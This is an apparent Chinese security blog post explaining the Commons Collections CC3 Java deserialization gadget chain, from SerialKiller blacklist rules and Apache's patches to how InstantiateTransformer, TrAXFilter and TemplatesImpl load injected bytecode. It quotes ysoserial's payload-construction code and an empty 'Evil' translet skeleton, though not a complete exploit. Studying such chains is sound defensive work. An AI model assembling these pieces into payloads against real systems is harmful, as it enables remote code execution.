---
pubDatetime: 2026-07-15
title: "CC3 反序列化链"
postSlug: cc3-deserialization-chain
featured: false
draft: false
tags:
  - Java
  - 代码审计
  - 反序列化
  - Commons Collections
description: "拆解 Commons Collections CC3 反序列化链，从 CC1 LazyMap 触发段到 TemplatesImpl、TrAXFilter 与 InstantiateTransformer 的执行段。"
---

# CC3 反序列化链

CC3 可以看成 CC1 LazyMap 链的变体。前半段负责把一次普通的 `Map` 调用送进 `LazyMap.get()`，后半段把 `InvokerTransformer` 换成了 `InstantiateTransformer + TrAXFilter + TemplatesImpl`。

---

## 1. CC1 链的修补与限制

### 1.1 SerialKiller

`ysoserial` 公开后，第三方开始用反序列化过滤器拦截已知 gadget 类。`SerialKiller` 是这种思路的代表：它继承 `ObjectInputStream`，重写 `resolveClass()`，在类名解析阶段做黑白名单判断。

源码位置：[SerialKiller.java](https://github.com/ikkisoft/SerialKiller/blob/4a09d4ad03e9e9535656ef7c55f9be0c046082b1/src/main/java/org/nibblesec/tools/SerialKiller.java#L40-L109)

核心流程：

```text
resolveClass(ObjectStreamClass serialInput)
 -> serialInput.getName()
 -> blacklist 正则匹配
 -> whitelist 正则匹配
 -> 通过后再 super.resolveClass(serialInput)
```

早期配置主要盯 `InvokerTransformer`：

```xml
<regexp>^org\.apache\.commons\.collections\.functors\.InvokerTransformer$</regexp>
```

出处：[3ce0fe5 serialkiller.conf](https://github.com/ikkisoft/SerialKiller/blob/3ce0fe5/config/serialkiller.conf#L5-L15)

CC3 的意义就在这里：它把 CC1 后半段里的 `InvokerTransformer` 换成了 `InstantiateTransformer + TrAXFilter + TemplatesImpl`。如果过滤器只盯 `InvokerTransformer`，这类变体就不会命中这条规则。

后续 SerialKiller 也很快把 `InstantiateTransformer` 加进黑名单：

```xml
<regexp>^org\.apache\.commons\.collections\.functors\.InstantiateTransformer$</regexp>
```

出处：[3618195 serialkiller.conf](https://github.com/ikkisoft/SerialKiller/blob/3618195/config/serialkiller.conf#L5-L17)

### 1.2 Apache 官方修补

SerialKiller 是第三方过滤器，Apache Commons Collections 自己也做了官方修补。

- **3.2.2**：functor 包里的一批 unsafe 类，默认反序列化会被拒绝；如果真要恢复旧行为，需要显式设置 `org.apache.commons.collections.enableUnsafeSerialization=true`
- **4.1**：这些 unsafe 类不再实现 `Serializable`

官方出处：

- [Apache Commons Collections Security Vulnerabilities](https://commons.apache.org/proper/commons-collections/security.html)
- [Commons Collections 3.2.2 release notes](https://commons.apache.org/proper/commons-collections/changes.html#Release_3.2.2_%E2%80%93_2015-11-15)
- [Commons Collections 4.1 release notes](https://commons.apache.org/proper/commons-collections/release_4_1.html)
- [InvokerTransformer 3.2.2 API](https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/functors/InvokerTransformer.html)

---

## 2. 链路总览

CC3 可以拆成两段看。

第一段是触发段，和 CC1 LazyMap 链基本一致：反序列化过程中，`AnnotationInvocationHandler.readObject()` 调用了代理 `Map` 的 `entrySet()`，动态代理把这次调用转给内层 `AnnotationInvocationHandler.invoke()`，最后落到 `LazyMap.get("entrySet")`。

第二段是执行段，也是 CC3 和 CC1 的主要差异。`LazyMap.get()` 触发 `ChainedTransformer` 后，不再走 `InvokerTransformer -> Runtime.exec()`，而是走：

```text
TrAXFilter.class
 -> new TrAXFilter(templatesInstance)
 -> templatesInstance.newTransformer()
 -> TemplatesImpl 加载 translet bytecode
```

因此后面会依次拆三件事：

| 问题 | 对应章节 |
|------|----------|
| `templatesInstance` 里面为什么要塞 `_bytecodes`、`_name`、`_tfactory` | `3. TemplatesImpl 载体` |
| payload 类为什么要继承 `AbstractTranslet`，以及 `_bytecodes` 如何被加载 | `3.2 AbstractTranslet`、`4. 类加载` |
| `ChainedTransformer` 为什么能自然接到 `TemplatesImpl.newTransformer()` | `5. 组件桥接` |

整条链如下：

```text
反序列化
 -> outer AnnotationInvocationHandler.readObject()
 -> proxyMap.entrySet()
 -> inner AnnotationInvocationHandler.invoke()
 -> LazyMap.get("entrySet")
 -> ChainedTransformer
 -> ConstantTransformer(TrAXFilter.class)
 -> InstantiateTransformer(Templates.class, templatesInstance)
 -> new TrAXFilter(templatesInstance)
 -> templatesInstance.newTransformer()
 -> TemplatesImpl.defineTransletClasses()
 -> ClassLoader#defineClass(...)
 -> translet 类初始化 / 实例化
```

前半段负责触发 `LazyMap.get()`。

后半段负责把 transformer 链接到 `TemplatesImpl.newTransformer()`，再落到 `defineClass()`。

---

## 3. TemplatesImpl 载体

`XSLT` 是一门用来转换 XML 的标准语言，`Xalan` 是 Apache 提供的一套 XSLT 引擎。`TemplatesImpl` 是 Xalan 里负责保存和加载 translet 的类。

正常情况下，XSLT 会先被编译成 translet class bytes，再由 `TemplatesImpl` 保存，后续调用 `newTransformer()` 时加载并实例化。

简化一下：

```text
XSLT
 -> translet class bytes
 -> TemplatesImpl._bytecodes
 -> newTransformer()
 -> defineClass(...)
 -> translet instance
```

### 3.1 载荷构造

CC3 里会手动创建一个 `TemplatesImpl`，然后通过反射设置几个私有字段：

```java
TemplatesImpl templatesInstance = new TemplatesImpl();

setField(templatesInstance, "_name", "cc3");
setField(templatesInstance, "_bytecodes", new byte[][]{classBytes});
setField(templatesInstance, "_tfactory", new TransformerFactoryImpl());
```

这不是随便猜出来的，而是直接对应 `ysoserial` 的构造代码：

```java
final T templates = tplClass.newInstance();

final byte[] classBytes = clazz.toBytecode();

Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
    classBytes, ClassFiles.classAsBytes(Foo.class)
});

Reflections.setFieldValue(templates, "_name", "Pwnr");
Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
return templates;
```

出处：`C:\Project\HackTools\ysoserial\src\main\java\ysoserial\payloads\util\Gadgets.java`

JDK 侧的字段和方法签名如下：

```text
private java.lang.String _name;
private byte[][] _bytecodes;
private transient TransformerFactoryImpl _tfactory;

private void defineTransletClasses();
private Translet getTransletInstance();
public synchronized Transformer newTransformer();
```

三个字段的作用：

| 字段 | 作用 |
|------|------|
| `_bytecodes` | 保存待加载的 translet class bytes |
| `_name` | 让 `TemplatesImpl` 处于可用模板状态 |
| `_tfactory` | 提供 transformer 和类加载所需的工厂上下文 |

`_bytecodes` 是二维数组，因为 XSLT 编译结果可能不止一个类：

```text
_bytecodes[0] -> defineClass(...)
_bytecodes[1] -> defineClass(...)
...
```

### 3.2 `AbstractTranslet`

payload 类通常继承 `AbstractTranslet`：

```java
public class Evil extends AbstractTranslet {
    static {
        // class initialization side effect
    }

    public void transform(...) {}
    public void transform(...) {}
}
```

这不是随手挑的父类，而是为了让这份 class bytes 符合 `TemplatesImpl` 对 translet 的预期。

---

## 4. 类加载

`TemplatesImpl` 的类加载能力最终落到 `ClassLoader#defineClass`。

### 4.1 `defineTransletClasses()`

OpenJDK 里的关键逻辑可以压成三段：

```java
if (_bytecodes == null) {
    throw new TransformerConfigurationException(...);
}
```

```java
_class[i] = loader.defineClass(_bytecodes[i]);
```

```java
if (_transletIndex < 0) {
    throw new TransformerConfigurationException(...);
}
```

出处：[TemplatesImpl.java](https://github.com/openjdk/jdk8u/blob/master/jaxp/src/com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java#L390-L486)

这一步做了两件事：

```text
_bytecodes -> Class[]
找到主 translet 类 -> _transletIndex
```

### 4.2 `getTransletInstance()` 与 `newTransformer()`

继续往下是：

```java
if (_name == null) return null;
if (_class == null) defineTransletClasses();
AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
translet.setTemplates(this);
```

然后：

```java
transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory);
```

这就是为什么 `newTransformer()` 会带出后面的类加载和实例化。

### 4.3 类定义与类初始化

`defineClass` 只负责把 class 文件格式的 `byte[]` 定义成 `Class` 对象。静态代码块不一定在这里执行。

在 CC3 里，后面的 `newInstance()` 会触发类初始化，所以 `static {}` 才会执行。

---

## 5. 组件桥接

### 5.1 InstantiateTransformer

`InstantiateTransformer` 的作用很简单：把“调用构造函数”包装成 transformer。

它保存两组信息：

```java
private final Class[] iParamTypes;
private final Object[] iArgs;
```

执行时近似等价于：

```java
Class cls = (Class) input;
Constructor ctor = cls.getConstructor(iParamTypes);
return ctor.newInstance(iArgs);
```

源码核心两行就是：

```java
Constructor con = ((Class) input).getConstructor(iParamTypes);
return con.newInstance(iArgs);
```

出处：`commons-collections-3.2.1-sources.jar` 中的 `InstantiateTransformer.java`

CC3 中：

```java
new ConstantTransformer(TrAXFilter.class),
new InstantiateTransformer(
    new Class[]{Templates.class},
    new Object[]{templatesInstance}
)
```

等价于：

```java
new TrAXFilter(templatesInstance)
```

### 5.2 TrAXFilter

`TrAXFilter` 是连接 `InstantiateTransformer` 和 `TemplatesImpl` 的桥。

构造函数里会调用：

```java
public TrAXFilter(Templates templates) throws TransformerConfigurationException {
    _templates = templates;
    _transformer = (TransformerImpl) templates.newTransformer();
    _transformerHandler = new TransformerHandlerImpl(_transformer);
    _overrideDefaultParser = _transformer.overrideDefaultParser();
}
```

源码链接：[TrAXFilter.java](https://github.com/JetBrains/jdk8u_jaxp/blob/master/src/com/sun/org/apache/xalan/internal/xsltc/trax/TrAXFilter.java#L581-L595)

所以：

```text
new TrAXFilter(templatesInstance)
 -> templatesInstance.newTransformer()
 -> TemplatesImpl.defineTransletClasses()
 -> ClassLoader#defineClass(...)
```

### 5.3 关系总览

```text
InstantiateTransformer 负责把 TrAXFilter.class 构造成对象。
TrAXFilter 的构造函数会调用 templates.newTransformer()。
templatesInstance 实际上就是一个被填好 _bytecodes 的 TemplatesImpl。
TemplatesImpl.newTransformer() 会进入 getTransletInstance()。
getTransletInstance() 最终走到 defineTransletClasses() / defineClass()。
```

---

## 6. 小结

CC3 的核心不是动态代理，而是后半段的替换：

```text
InvokerTransformer 反射 Runtime
```

换成：

```text
InstantiateTransformer
 -> new TrAXFilter(templatesInstance)
 -> TemplatesImpl.newTransformer()
 -> defineClass(_bytecodes)
```

各组件角色：

| 组件 | 角色 |
|------|------|
| `LazyMap` | 触发 transformer 链 |
| `ConstantTransformer` | 固定返回 `TrAXFilter.class` |
| `InstantiateTransformer` | 调用 `TrAXFilter(Templates)` 构造函数 |
| `TrAXFilter` | 构造时调用 `templates.newTransformer()` |
| `TemplatesImpl` | 加载并实例化 `_bytecodes` 里的 translet 类 |

一句话：

> CC3 用 `InstantiateTransformer` 构造 `TrAXFilter`，再借 `TrAXFilter` 构造函数触发 `TemplatesImpl.newTransformer()`，最终让 `TemplatesImpl` 通过 `defineClass` 加载可控字节码。
